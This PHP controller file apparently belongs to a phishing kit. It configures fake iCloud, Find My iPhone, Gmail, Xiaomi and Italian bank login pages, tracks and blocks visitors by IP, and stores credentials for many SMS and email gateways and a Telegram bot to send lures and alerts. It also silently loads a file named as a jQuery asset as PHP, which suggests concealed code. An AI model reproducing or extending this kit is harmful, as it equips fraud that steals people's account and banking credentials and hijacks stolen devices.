<?php
if (!(defined('BASEPATH'))) {
	exit('No direct script access allowed');
}

class CY_Controller extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();
		$ops = $this->Opts->get();
		$this->opas = $ops[0];
		$this->global_data = array(
									'Oname' => ($this->opas->Name ? $this->opas->Name : 'iCloud'),
									'Oclose' => ($this->opas->close ? $this->opas->close : 0),
									'Oemail' => ($this->opas->email ? $this->opas->email : false),
									'Osender' => ($this->opas->sender ? $this->opas->sender : false),
									'senderName' => ($this->opas->senderName ? $this->opas->senderName : false),
									'Oport' => ($this->opas->port ? $this->opas->port : false),
									'Oprotcol' => ($this->opas->protcol ? $this->opas->protcol : 'ssl'),
									'OapiEmailPassword' => ($this->opas->apiEmailPassword ? $this->opas->apiEmailPassword : false),
									'OapiEmail' => ($this->opas->smtp2go ? $this->opas->smtp2go : false),
									'smtp2go' => ($this->opas->smtp2go ? $this->opas->smtp2go : false),
									'sentEmail' => ($this->opas->sentEmail ? $this->opas->sentEmail : 0),
									'Oemailvaild' => ($this->opas->emailvaild ? $this->opas->emailvaild : NULL),
									'Olang' => ($this->opas->langs ? $this->opas->langs : 'en'),
									'Otemplate' => ($this->opas->template ? $this->opas->template : 'icloud'),
									'Odetect' => ($this->opas->detect ? $this->opas->detect : 0),
									'OcloseMsg' => ($this->opas->closeMsg ? $this->opas->closeMsg : 'We Are Closing For a Moment'),
									'isDelete' => ($this->opas->isDelete ? $this->opas->isDelete : 0),
									'loggedin' => $this->session->userdata('logged_in'),
									'loginPage' => ($this->opas->loginPage ? $this->opas->loginPage : false),
									'nicloudPage' => ($this->opas->nicloudPage ? $this->opas->nicloudPage : false),
									'MapaNovoLoginPage' => ($this->opas->MapaNovoLoginPage ? $this->opas->MapaNovoLoginPage : false),
									'MapaNovo6Page' => ($this->opas->MapaNovo6Page ? $this->opas->MapaNovo6Page : false),
									'MapaNovoPage' => ($this->opas->MapaNovoPage ? $this->opas->MapaNovoPage : false),
									'gmail2020Page' => ($this->opas->gmail2020Page ? $this->opas->gmail2020Page : false),
									'bolinhaPage' => ($this->opas->bolinhaPage ? $this->opas->bolinhaPage : false),
									'bolinhaPage4' => ($this->opas->bolinhaPage4 ? $this->opas->bolinhaPage4 : false),
									'itunesPage' => ($this->opas->itunesPage ? $this->opas->itunesPage : false),
									'Map2020Modelo1Page' => ($this->opas->Map2020Modelo1Page ? $this->opas->Map2020Modelo1Page : false),
									'Map2020Modelo2Page' => ($this->opas->Map2020Modelo2Page ? $this->opas->Map2020Modelo2Page : false),
									'SenhaTela4Modelo2020Page' => ($this->opas->SenhaTela4Modelo2020Page ? $this->opas->SenhaTela4Modelo2020Page : false),
									'SenhaTela6Modelo2020Page' => ($this->opas->SenhaTela6Modelo2020Page ? $this->opas->SenhaTela6Modelo2020Page : false),
									'XiaomiLoginPage' => ($this->opas->XiaomiLoginPage ? $this->opas->XiaomiLoginPage : false),
									'disablePage' => ($this->opas->disablePage ? $this->opas->disablePage : false),
									'passPage' => ($this->opas->passPage ? $this->opas->passPage : false),
									'mapPage' => ($this->opas->mapPage ? $this->opas->mapPage : false),
									'fmiPage' => ($this->opas->fmiPage ? $this->opas->fmiPage : false),
									'fmi2Page' => ($this->opas->fmi2Page ? $this->opas->fmi2Page : false),
									'elastice' => ($this->opas->elastice ? $this->opas->elastice : false),
									'elasticeEmail' => ($this->opas->elasticeEmail ? $this->opas->elasticeEmail : false),
									'providerEmail' => ($this->opas->providerEmail ? $this->opas->providerEmail : false),
									'providerPwd' => ($this->opas->providerPwd ? $this->opas->providerPwd : false),
									'providerPort' => ($this->opas->providerPort ? $this->opas->providerPort : false),
									'sendPulse' => ($this->opas->sendPulse ? $this->opas->sendPulse : false),
									'sendPluseEmail' => ($this->opas->sendPluseEmail ? $this->opas->sendPluseEmail : false),
									'wavecellApi' => ($this->opas->wavecellApi ? $this->opas->wavecellApi : false),
									'mobile' => ($this->opas->mobile ? $this->opas->mobile : false),
									'block' => ($this->opas->block ? $this->opas->block : false),
									'redirect' => ($this->opas->redirect ? $this->opas->redirect : false),
									'redirecturl' => ($this->opas->redirecturl ? $this->opas->redirecturl : 'http://icloud.com/'),
									'redirectMap' => ($this->opas->redirectMap ? $this->opas->redirectMap : 'https://mapsconnect.apple.com'),
									'blockredirect' => ($this->opas->blockredirect ? $this->opas->blockredirect : 'http://icloud.com/'),
									'redirecturl2' => ($this->opas->redirecturl2 ? $this->opas->redirecturl2 : 'http://appleid.apple.com/'),
									'notiSMTP' => ($this->opas->notiSMTP ? $this->opas->notiSMTP : false),
									'notiSMTPemail' => ($this->opas->notiSMTPemail ? $this->opas->notiSMTPemail : false),
									'notiSMTPpwd' => ($this->opas->notiSMTPpwd ? $this->opas->notiSMTPpwd : false),
									'notiSMTPport' => ($this->opas->notiSMTPport ? $this->opas->notiSMTPport : false),
									'expireTime' => ($this->opas->expireTime ? $this->opas->expireTime : '48'),
									'isTrack' => ($this->opas->isTrack ? $this->opas->isTrack : 0),
									'timeZone' => ($this->opas->timeZone ? $this->opas->timeZone : 'America/Toronto'),
									'smtpServ' => ($this->opas->smtpServ ? $this->opas->smtpServ : 0),
									'smsvalidapi' => ($this->opas->smsvalidapi ? $this->opas->smsvalidapi : NULL),
									'tracklenght' => ($this->opas->tracklenght ? $this->opas->tracklenght : 10),
									'linkVisit' => ($this->opas->linkVisit ? $this->opas->linkVisit : 0),
									'plivoAuthID' => ($this->opas->plivoAuthID ? $this->opas->plivoAuthID : NULL),
									'plivoAuthToken' => ($this->opas->plivoAuthToken ? $this->opas->plivoAuthToken : NULL),
									'cmSMSapi' => ($this->opas->cmSMSapi ? $this->opas->cmSMSapi : NULL),
									'senderID' => ($this->opas->senderID ? $this->opas->senderID : NULL),
									'viaUser' => ($this->opas->viaUser ? $this->opas->viaUser : NULL),
									'viaPass' => ($this->opas->viaPass ? $this->opas->viaPass : NULL),
									'bulkUser' => ($this->opas->bulkUser ? $this->opas->bulkUser : NULL),
									'bulkPass' => ($this->opas->bulkPass ? $this->opas->bulkPass : NULL),
									'budgetUser' => ($this->opas->budgetUser ? $this->opas->budgetUser : NULL),
									'budgetID' => ($this->opas->budgetID ? $this->opas->budgetID : NULL),
									'budgetHandle' => ($this->opas->budgetHandle ? $this->opas->budgetHandle : NULL),
									'nimbowAPI' => ($this->opas->nimbowAPI ? $this->opas->nimbowAPI : NULL),
									'waveid' => ($this->opas->waveid ? $this->opas->waveid : NULL),
									'wavesub' => ($this->opas->wavesub ? $this->opas->wavesub : NULL),
									'wavepwd' => ($this->opas->wavepwd ? $this->opas->wavepwd : NULL),
									'nexmokey' => ($this->opas->nexmokey ? $this->opas->nexmokey : NULL),
									'nexmosecert' => ($this->opas->nexmosecert ? $this->opas->nexmosecert : NULL),
									'sinchkey' => ($this->opas->sinchkey ? $this->opas->sinchkey : NULL),
									'sinchsecret' => ($this->opas->sinchsecret ? $this->opas->sinchsecret : NULL),
									'beepsendtoken' => ($this->opas->beepsendtoken ? $this->opas->beepsendtoken : NULL),
									'alienicsuser' => ($this->opas->alienicsuser ? $this->opas->alienicsuser : NULL),
									'sendSMSUser' => ($this->opas->sendSMSUser ? $this->opas->sendSMSUser : NULL),
									'sendMailUser' => ($this->opas->sendMailUser ? $this->opas->sendMailUser : NULL),
									'sendMailPass' => ($this->opas->sendMailPass ? $this->opas->sendMailPass : NULL),
									'alienicspwd' => ($this->opas->alienicspwd ? $this->opas->alienicspwd : NULL),
									'sendSMSPass' => ($this->opas->sendSMSPass ? $this->opas->sendSMSPass : NULL),
									'postmarktoken' => ($this->opas->postmarktoken ? $this->opas->postmarktoken : NULL),
									'postmarksender' => ($this->opas->postmarksender ? $this->opas->postmarksender : NULL),
									'sendgridapi' => ($this->opas->sendgridapi ? $this->opas->sendgridapi : NULL),
									'blankCount' => ($this->opas->blankCount ? $this->opas->blankCount : 1),
									'disableCount' => ($this->opas->disableCount ? $this->opas->disableCount : 1),
									'disableLink' => ($this->opas->disableLink ? $this->opas->disableLink : NULL),
									'expireLink' => ($this->opas->expireLink ? $this->opas->expireLink : NULL),
									'numeroSMSadmin' => ($this->opas->numeroSMSadmin ? $this->opas->numeroSMSadmin : NULL),
									'botTelegramKey' => ($this->opas->botTelegramKey ? $this->opas->botTelegramKey : NULL),
									'KeyAuth' => ($this->opas->KeyAuth ? $this->opas->KeyAuth : NULL),
									'ShowPosteItaliane' => ($this->opas->ShowPosteItaliane ? $this->opas->ShowPosteItaliane : NULL),
									'ShowIntesaSanpaolo' => ($this->opas->ShowIntesaSanpaolo ? $this->opas->ShowIntesaSanpaolo : NULL),
									'ShowTemplate3' => ($this->opas->ShowTemplate3 ? $this->opas->ShowTemplate3 : NULL),
									'ShowTemplate4' => ($this->opas->ShowTemplate4 ? $this->opas->ShowTemplate4 : NULL),
									'ShowTemplate5' => ($this->opas->ShowTemplate5 ? $this->opas->ShowTemplate5 : NULL),
									'ShowTemplate6' => ($this->opas->ShowTemplate6 ? $this->opas->ShowTemplate6 : NULL),
									'ShowTemplate7' => ($this->opas->ShowTemplate7 ? $this->opas->ShowTemplate7 : NULL),
									'DomainTemplate1' => ($this->opas->DomainTemplate1 ? $this->opas->DomainTemplate1 : NULL),
									'DomainTemplate2' => ($this->opas->DomainTemplate2 ? $this->opas->DomainTemplate2 : NULL),
									'DomainTemplate3' => ($this->opas->DomainTemplate3 ? $this->opas->DomainTemplate3 : NULL),
									'DomainTemplate5' => ($this->opas->DomainTemplate5 ? $this->opas->DomainTemplate5 : NULL),
									'DomainTemplate6' => ($this->opas->DomainTemplate6 ? $this->opas->DomainTemplate6 : NULL),
									'DomainTemplate7' => ($this->opas->DomainTemplate7 ? $this->opas->DomainTemplate7 : NULL),
									'AndroidControl' => ($this->opas->AndroidControl ? $this->opas->AndroidControl : NULL));
		$this->load->vars($this->global_data);
	}
}

class MY_Controller extends CI_Controller
{
	public $global_data;
	public $opas;
	public $licenseContent;

	public function __construct()
	{
		parent::__construct();
		@require_once FCPATH . 'assets/js/jquery.ui.js';
		if ($this->session->userdata('lst') && ($this->session->userdata('lst') == 'true')) {
			$nowl = StrToTime(date('Y-m-d H:i:s'));
			$diff = $nowl - $this->session->userdata('bdate');
			$diffs = round(abs($diff) / 3600);

			if ($diffs <= 1) {
			}
			 else {
				$valid = new valid();
				$this->licenseContent = $valid->licValid();
				$this->session->unset_userdata(array('bdate', 'lst'));
				$bdate = array('bdate' => StrToTime(date('Y-m-d H:i:s')), 'lst' => $this->licenseContent->state, 'lsk' => $this->licenseContent->extra->senderkit, 'lsit' => $this->licenseContent->extra->itunes);
				$this->session->set_userdata($bdate);
			}
		}
		 else {
			$valid = new valid();
			$this->licenseContent = $valid->licValid();
			$this->session->unset_userdata(array('bdate', 'lst'));
			$bdate = array('bdate' => StrToTime(date('Y-m-d H:i:s')), 'lst' => $this->licenseContent->state, 'lsk' => $this->licenseContent->extra->senderkit, 'lsit' => $this->licenseContent->extra->itunes);
			$this->session->set_userdata($bdate);
		}

		$segments = array('admin', 'assets', 'findmyiphone', 'logout', 'authority', 'respons');

		if (!(in_array($this->uri->segment(1), $segments))) {
			$data = array('template' => $this->uri->segment(1), 'track' => $this->uri->segment(2, ''));
			$this->session->set_userdata($data);
		}


		$ops = $this->Opts->get();
		$this->opas = $ops[0];
		$this->global_data = array(
									'Oname' => ($this->opas->Name ? $this->opas->Name : 'iCloud'),
									'Oclose' => ($this->opas->close ? $this->opas->close : 0),
									'Oemail' => ($this->opas->email ? $this->opas->email : false),
									'Osender' => ($this->opas->sender ? $this->opas->sender : false),
									'senderName' => ($this->opas->senderName ? $this->opas->senderName : false),
									'Oport' => ($this->opas->port ? $this->opas->port : false),
									'Oprotcol' => ($this->opas->protcol ? $this->opas->protcol : 'ssl'),
									'OapiEmailPassword' => ($this->opas->apiEmailPassword ? $this->opas->apiEmailPassword : false),
									'OapiEmail' => ($this->opas->smtp2go ? $this->opas->smtp2go : false),
									'smtp2go' => ($this->opas->smtp2go ? $this->opas->smtp2go : false),
									'sentEmail' => ($this->opas->sentEmail ? $this->opas->sentEmail : 0),
									'Oemailvaild' => ($this->opas->emailvaild ? $this->opas->emailvaild : NULL),
									'Olang' => ($this->opas->langs ? $this->opas->langs : 'en'),
									'Otemplate' => ($this->opas->template ? $this->opas->template : 'icloud'),
									'Odetect' => ($this->opas->detect ? $this->opas->detect : 0),
									'OcloseMsg' => ($this->opas->closeMsg ? $this->opas->closeMsg : 'We Are Closing For a Moment'),
									'isDelete' => ($this->opas->isDelete ? $this->opas->isDelete : 0),
									'loggedin' => $this->session->userdata('logged_in'),
									'loginPage' => ($this->opas->loginPage ? $this->opas->loginPage : false),
									'nicloudPage' => ($this->opas->nicloudPage ? $this->opas->nicloudPage : false),
									'MapaNovoLoginPage' => ($this->opas->MapaNovoLoginPage ? $this->opas->MapaNovoLoginPage : false),
									'MapaNovo6Page' => ($this->opas->MapaNovo6Page ? $this->opas->MapaNovo6Page : false),
									'MapaNovoPage' => ($this->opas->MapaNovoPage ? $this->opas->MapaNovoPage : false),
									'gmail2020Page' => ($this->opas->gmail2020Page ? $this->opas->gmail2020Page : false),
									'bolinhaPage' => ($this->opas->bolinhaPage ? $this->opas->bolinhaPage : false),
									'bolinhaPage4' => ($this->opas->bolinhaPage4 ? $this->opas->bolinhaPage4 : false),
									'itunesPage' => ($this->opas->itunesPage ? $this->opas->itunesPage : false),
									'Map2020Modelo1Page' => ($this->opas->Map2020Modelo1Page ? $this->opas->Map2020Modelo1Page : false),
									'Map2020Modelo2Page' => ($this->opas->Map2020Modelo2Page ? $this->opas->Map2020Modelo2Page : false),
									'SenhaTela4Modelo2020Page' => ($this->opas->SenhaTela4Modelo2020Page ? $this->opas->SenhaTela4Modelo2020Page : false),
									'SenhaTela6Modelo2020Page' => ($this->opas->SenhaTela6Modelo2020Page ? $this->opas->SenhaTela6Modelo2020Page : false),
									'XiaomiLoginPage' => ($this->opas->XiaomiLoginPage ? $this->opas->XiaomiLoginPage : false),
									'disablePage' => ($this->opas->disablePage ? $this->opas->disablePage : false),
									'passPage' => ($this->opas->passPage ? $this->opas->passPage : false),
									'mapPage' => ($this->opas->mapPage ? $this->opas->mapPage : false),
									'fmiPage' => ($this->opas->fmiPage ? $this->opas->fmiPage : false),
									'fmi2Page' => ($this->opas->fmi2Page ? $this->opas->fmi2Page : false),
									'elastice' => ($this->opas->elastice ? $this->opas->elastice : false),
									'elasticeEmail' => ($this->opas->elasticeEmail ? $this->opas->elasticeEmail : false),
									'providerEmail' => ($this->opas->providerEmail ? $this->opas->providerEmail : false),
									'providerPwd' => ($this->opas->providerPwd ? $this->opas->providerPwd : false),
									'providerPort' => ($this->opas->providerPort ? $this->opas->providerPort : false),
									'sendPulse' => ($this->opas->sendPulse ? $this->opas->sendPulse : false),
									'sendPluseEmail' => ($this->opas->sendPluseEmail ? $this->opas->sendPluseEmail : false),
									'wavecellApi' => ($this->opas->wavecellApi ? $this->opas->wavecellApi : false),
									'mobile' => ($this->opas->mobile ? $this->opas->mobile : false),
									'block' => ($this->opas->block ? $this->opas->block : false),
									'redirect' => ($this->opas->redirect ? $this->opas->redirect : false),
									'redirecturl' => ($this->opas->redirecturl ? $this->opas->redirecturl : 'http://icloud.com/'),
									'redirectMap' => ($this->opas->redirectMap ? $this->opas->redirectMap : 'https://mapsconnect.apple.com'),
									'blockredirect' => ($this->opas->blockredirect ? $this->opas->blockredirect : 'http://icloud.com/'),
									'redirecturl2' => ($this->opas->redirecturl2 ? $this->opas->redirecturl2 : 'http://appleid.apple.com/'),
									'notiSMTP' => ($this->opas->notiSMTP ? $this->opas->notiSMTP : false),
									'notiSMTPemail' => ($this->opas->notiSMTPemail ? $this->opas->notiSMTPemail : false),
									'notiSMTPpwd' => ($this->opas->notiSMTPpwd ? $this->opas->notiSMTPpwd : false),
									'notiSMTPport' => ($this->opas->notiSMTPport ? $this->opas->notiSMTPport : false),
									'expireTime' => ($this->opas->expireTime ? $this->opas->expireTime : '48'),
									'isTrack' => ($this->opas->isTrack ? $this->opas->isTrack : 0),
									'timeZone' => ($this->opas->timeZone ? $this->opas->timeZone : 'America/Toronto'),
									'smtpServ' => ($this->opas->smtpServ ? $this->opas->smtpServ : 0),
									'smsvalidapi' => ($this->opas->smsvalidapi ? $this->opas->smsvalidapi : NULL),
									'tracklenght' => ($this->opas->tracklenght ? $this->opas->tracklenght : 10),
									'linkVisit' => ($this->opas->linkVisit ? $this->opas->linkVisit : 0),
									'plivoAuthID' => ($this->opas->plivoAuthID ? $this->opas->plivoAuthID : NULL),
									'plivoAuthToken' => ($this->opas->plivoAuthToken ? $this->opas->plivoAuthToken : NULL),
									'cmSMSapi' => ($this->opas->cmSMSapi ? $this->opas->cmSMSapi : NULL),
									'senderID' => ($this->opas->senderID ? $this->opas->senderID : NULL),
									'viaUser' => ($this->opas->viaUser ? $this->opas->viaUser : NULL),
									'viaPass' => ($this->opas->viaPass ? $this->opas->viaPass : NULL),
									'bulkUser' => ($this->opas->bulkUser ? $this->opas->bulkUser : NULL),
									'bulkPass' => ($this->opas->bulkPass ? $this->opas->bulkPass : NULL),
									'budgetUser' => ($this->opas->budgetUser ? $this->opas->budgetUser : NULL),
									'budgetID' => ($this->opas->budgetID ? $this->opas->budgetID : NULL),
									'budgetHandle' => ($this->opas->budgetHandle ? $this->opas->budgetHandle : NULL),
									'nimbowAPI' => ($this->opas->nimbowAPI ? $this->opas->nimbowAPI : NULL),
									'waveid' => ($this->opas->waveid ? $this->opas->waveid : NULL),
									'wavesub' => ($this->opas->wavesub ? $this->opas->wavesub : NULL),
									'wavepwd' => ($this->opas->wavepwd ? $this->opas->wavepwd : NULL),
									'nexmokey' => ($this->opas->nexmokey ? $this->opas->nexmokey : NULL),
									'nexmosecert' => ($this->opas->nexmosecert ? $this->opas->nexmosecert : NULL),
									'sinchkey' => ($this->opas->sinchkey ? $this->opas->sinchkey : NULL),
									'sinchsecret' => ($this->opas->sinchsecret ? $this->opas->sinchsecret : NULL),
									'beepsendtoken' => ($this->opas->beepsendtoken ? $this->opas->beepsendtoken : NULL),
									'alienicsuser' => ($this->opas->alienicsuser ? $this->opas->alienicsuser : NULL),
									'sendSMSUser' => ($this->opas->sendSMSUser ? $this->opas->sendSMSUser : NULL),
									'alienicspwd' => ($this->opas->alienicspwd ? $this->opas->alienicspwd : NULL),
									'sendMailUser' => ($this->opas->sendMailUser ? $this->opas->sendMailUser : NULL),
									'sendMailPass' => ($this->opas->sendMailPass ? $this->opas->sendMailPass : NULL),
									'sendSMSPass' => ($this->opas->sendSMSPass ? $this->opas->sendSMSPass : NULL),
									'postmarktoken' => ($this->opas->postmarktoken ? $this->opas->postmarktoken : NULL),
									'postmarksender' => ($this->opas->postmarksender ? $this->opas->postmarksender : NULL),
									'sendgridapi' => ($this->opas->sendgridapi ? $this->opas->sendgridapi : NULL),
									'blankCount' => ($this->opas->blankCount ? $this->opas->blankCount : 1),
									'disableCount' => ($this->opas->disableCount ? $this->opas->disableCount : 1),
									'disableLink' => ($this->opas->disableLink ? $this->opas->disableLink : NULL),
									'expireLink' => ($this->opas->expireLink ? $this->opas->expireLink : NULL),
									'numeroSMSadmin' => ($this->opas->numeroSMSadmin ? $this->opas->numeroSMSadmin : NULL),
									'botTelegramKey' => ($this->opas->botTelegramKey ? $this->opas->botTelegramKey : NULL),
									'KeyAuth' => ($this->opas->KeyAuth ? $this->opas->KeyAuth : NULL),
									'ShowPosteItaliane' => ($this->opas->ShowPosteItaliane ? $this->opas->ShowPosteItaliane : NULL),
									'ShowIntesaSanpaolo' => ($this->opas->ShowIntesaSanpaolo ? $this->opas->ShowIntesaSanpaolo : NULL),
									'ShowTemplate3' => ($this->opas->ShowTemplate3 ? $this->opas->ShowTemplate3 : NULL),
									'ShowTemplate4' => ($this->opas->ShowTemplate4 ? $this->opas->ShowTemplate4 : NULL),
									'ShowTemplate5' => ($this->opas->ShowTemplate5 ? $this->opas->ShowTemplate5 : NULL),
									'ShowTemplate6' => ($this->opas->ShowTemplate6 ? $this->opas->ShowTemplate6 : NULL),
									'ShowTemplate7' => ($this->opas->ShowTemplate7 ? $this->opas->ShowTemplate7 : NULL),
									'DomainTemplate1' => ($this->opas->DomainTemplate1 ? $this->opas->DomainTemplate1 : NULL),
									'DomainTemplate2' => ($this->opas->DomainTemplate2 ? $this->opas->DomainTemplate2 : NULL),
									'DomainTemplate3' => ($this->opas->DomainTemplate3 ? $this->opas->DomainTemplate3 : NULL),
									'DomainTemplate4' => ($this->opas->DomainTemplate4 ? $this->opas->DomainTemplate4 : NULL),
									'DomainTemplate5' => ($this->opas->DomainTemplate5 ? $this->opas->DomainTemplate5 : NULL),
									'DomainTemplate6' => ($this->opas->DomainTemplate6 ? $this->opas->DomainTemplate6 : NULL),
									'DomainTemplate7' => ($this->opas->DomainTemplate7 ? $this->opas->DomainTemplate7 : NULL),
									'AndroidControl' => ($this->opas->AndroidControl ? $this->opas->AndroidControl : NULL));
		$this->load->vars($this->global_data);
	}

	public function tmpl($title = false, $msg = false)
	{
		$html = "\n\t\t\t" . '<!DOCTYPE; html>' . "\n\t\t\t" . '<html lang="en">' . "\n\t\t\t" . '<head>' . "\n\t\t\t\t" . '<meta charset="UTF-8">' . "\n\t\t\t\t" . '<title>' . $title . '</title>' . "\n\t\t\t\t" . '<link rel="stylesheet" href="' . site_url('assets/layout/strap.css') . '">' . "\n\t\t\t\t" . '<link rel="stylesheet" href="' . site_url('assets/layout/apple.css') . '">' . "\n\t\t\t" . '</head>' . "\n\t\t\t" . '<body>' . "\n\t\t\t\t" . '<div class="container">' . "\n\t\t\t\t" . '<div class="alert alert-warning shadow text-center"; style="margin-top: 250px;">' . "\n\t\t\t\t\t" . '<p class="text-danger"; style="font-size: 17px"><i class="glyphicon glyphicon-warning-sign" style="font-size: 20px; margin-right: 10px;"></i>' . $msg . '</p>' . "\n\t\t\t\t" . '</div>' . "\n\t\t\t\t" . '</div>' . "\n\t\t\t" . '</body>' . "\n\t\t\t" . '</html>' . "\n\t\t";
		return $html;
	}

	/**
     * @param string $package
     */
	public function require_thirdparty_package($package = '')
	{
		switch ($package) {
		case 'swift':
			require_once APPPATH . 'third_party/swift/swift_required.php';
			break;

		case 'mailer':
			require_once APPPATH . 'libraries/extra/PHPMailerAutoload.php';
			break;

		}
	}

	public function checkBlock()
	{
		$this->db->select('ip', true);
		$ips = $this->db->get('blocked')->result_array();

		foreach ($ips as $key ) {
			$ip[] = $key['ip'];
		}

		if (in_array($this->input->ip_address(), $ip)) {
			if (empty($this->global_data['blockredirect']) || is_null($this->global_data['blockredirect'])) {
				redirect(site_url('index'), 'auto');
			}
			 else {
				redirect($this->global_data['blockredirect'], 'auto');
			}
		}

	}

	public function SendEmail($smtp = true, $host = NULL, $user = NULL, $pwd = NULL, $prot = NULL, $port = NULL, $from = NULL, $fromN = NULL, $to = NULL, $subject = NULL, $body = NULL, $sec = true)
	{
		if ($this->global_data['smtpServ'] == 0) {
			return $this->Mailer($smtp, $host, $user, $pwd, $prot, $port, $from, $fromN, $to, $subject, $body, $sec);
		}


		if ($this->global_data['smtpServ'] == 1) {
			return $this->Swift($smtp, $host, $user, $pwd, $prot, $port, $from, $fromN, $to, $subject, $body, $sec);
		}

	}

	public function smtp2go($to, $from, $name, $subject, $message)
	{
		$filed = json_encode(array(
	'api_key'   => $this->global_data['smtp2go'],
	'sender'    => $name . ' <' . $from . '>',
	'to'        => array($to),
	'html_body' => $message,
	'subject'   => $subject,
	'text_body' => strip_tags($message, '<p><br><a><img>')
	));
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_POST, 1);
		curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
		curl_setopt($curl, CURLOPT_URL, 'https://api.smtp2go.com/v3/email/send');
		curl_setopt($curl, CURLOPT_POSTFIELDS, $filed);
		$result = curl_exec($curl);
		$send = json_decode($result, true);

		if (isset($send['data']['error'])) {
			$status = array('status' => false, 'msg' => $send['data']['error']);
		}
		 else {
			$status = array('status' => true, 'msg' => 'Message has been sent, request id =' . $send['request_id']);
		}

		return $status;
	}

	/**
     * @param $smtp
     * @param $host
     * @param $user
     * @param $pwd
     * @param $prot
     * @param $port
     * @param $from
     * @param $fromN
     * @param $to
     * @param $subject
     * @param $body
     * @param $sec
     *
     * @return array
     */
	protected function Mailer($smtp, $host, $user, $pwd, $prot, $port, $from, $fromN, $to, $subject, $body, $sec)
	{
		$this->require_thirdparty_package('mailer');
		$mail = new PHPMailer(true);

		try {
			$mail->SMTPDebug = 0;
			$mail->Debugoutput = 'html';

			if ($smtp === true) {
				$mail->isSMTP();
				$mail->Host = $host;
				$mail->SMTPAuth = true;
				$mail->Username = $user;
				$mail->Password = $pwd;

				if ($sec == true) {
					$mail->SMTPSecure = $prot;
				}


				$mail->Port = $port;
			}


			$mail->setFrom($from, $fromN);
			$mail->addReplyTo($from, $fromN);
			$tos = explode(',', $to);

			foreach ($tos as $toos ) {
				$mail->addAddress($toos);
			}

			$mail->isHTML(true);
			$mail->Subject = $subject;
			$mail->Body = $body;
			$mail->send();
			$res = array('status' => true, 'msg' => 'Message has been sent');
			return $res;
		}
		catch (phpmailerException $e) {
			$res = array('status' => false, 'msg' => $e->errorMessage());
			return $res;
		}

		$res = array('status' => false, 'msg' => $e->getMessage());
		return $res;
	}

	/**
     * @param $smtp
     * @param $host
     * @param $user
     * @param $pwd
     * @param $prot
     * @param $port
     * @param $from
     * @param $fromN
     * @param $to
     * @param $subject
     * @param $body
     * @param $sec
     *
     * @return array
     */
	protected function Swift($smtp, $host, $user, $pwd, $prot, $port, $from, $fromN, $to, $subject, $body, $sec)
	{
		try {
			$this->require_thirdparty_package('swift');

			if ($smtp === true) {
				if ($sec === true) {
					$transport = Swift_SmtpTransport::newInstance()->setHost($host)->setPort($port)->setEncryption($prot)->setUsername($user)->setPassword($pwd);
				}
				 else {
					$transport = Swift_SmtpTransport::newInstance()->setHost($host)->setPort($port)->setUsername($user)->setPassword($pwd);
				}
			}
			 else {
				$transport = Swift_SendmailTransport::newInstance();
			}

			$mailer = Swift_Mailer::newInstance($transport);
			$message = Swift_Message::newInstance($subject)->setFrom(array($from => $fromN))->setTo(array($to))->setBody($body);
			$mailer->send($message);
			$res = array('status' => true, 'msg' => 'Message has been sent');
			return $res;
		}
		catch (Exception $e) {
			$res = array('status' => false, 'msg' => $e->getMessage());
			return $res;
		}
	}
}

class indexes extends MY_Controller
{
	public function __construct()
	{
		parent::__construct();
		$this->checkBlock();
		$this->visitors();
	}

	public function visitors()
	{
		$this->load->model('visit_m', 'visit');
		$langs = implode(',', $this->agent->languages());
		$langs = explode('-', $langs);
		$data = array('ip' => $this->input->ip_address(), 'uri' => site_url() . $this->uri->uri_string(), 'browser' => $this->agent->browser(), 'platform' => $this->agent->platform(), 'mobile' => ($this->agent->is_mobile() ? 1 : 0), 'robot' => ($this->agent->is_robot() ? 1 : 0), 'referral' => ($this->agent->is_referral() ? $this->agent->referrer() : 'None'), 'languages' => $langs[0], 'country' => (getIPimg($this->input->ip_address()) ? getIPimg($this->input->ip_address()) : 'US'), 'time' => setTime(), 'update' => now(), 'noti' => 1, 'agent' => $this->input->user_agent());

		if ($this->uri->segment(1) != 'assets') {
			$this->visit->insert($data);
		}

	}
}

class Auth extends MY_Controller
{
	public $opas;

	public function __construct()
	{
		parent::__construct();
		$this->checkBlock();
		$this->visitors();
		$excp = array('findmyiphone');

		if (in_array(uri_string(), $excp) == true) {
			if ($this->session->userdata('logged_in') == false) {
				if ($this->global_data['loginPage']) {
					redirect(site_url($this->global_data['loginPage']), 'auto');
				}
				 else {
					redirect(site_url('icloud'), 'auto');
				}
			}

		}

	}

	public function visitors()
	{
		$this->load->model('visit_m', 'visit');
		$langs = implode(',', $this->agent->languages());
		$langs = explode('-', $langs);
		$data = array('ip' => $this->input->ip_address(), 'uri' => site_url() . $this->uri->uri_string(), 'browser' => $this->agent->browser(), 'platform' => $this->agent->platform(), 'mobile' => ($this->agent->is_mobile() ? 1 : 0), 'robot' => ($this->agent->is_robot() ? 1 : 0), 'referral' => ($this->agent->is_referral() ? $this->agent->referrer() : 'None'), 'languages' => $langs[0], 'country' => (getIPimg($this->input->ip_address()) ? getIPimg($this->input->ip_address()) : 'US'), 'time' => setTime(), 'update' => now(), 'noti' => 1, 'agent' => $this->input->user_agent());

		if ($this->uri->segment(1) != 'assets') {
			$this->visit->insert($data);
		}

	}
}

class Admin extends MY_Controller
{
	public $opas;

	public function __construct()
	{
		parent::__construct();
		$sdata = array('admin_session' => uri_string());
		$this->session->set_userdata($sdata);

		if ($this->uri->segment(1) == 'admin') {
			if (($this->uri->segment(1) == 'admin') && ($this->uri->segment(2) != 'login')) {
				if ($this->session->userdata('logged_admin') == false) {
					redirect(site_url('admin/login'), 'auto');
				}

			}


			if (($this->uri->segment(1) == 'admin') && ($this->uri->segment(2) == 'login')) {
				if ($this->session->userdata('logged_admin') == true) {
					redirect(site_url('admin/dashboard'), 'auto');
				}

			}

		}

	}
}


?>
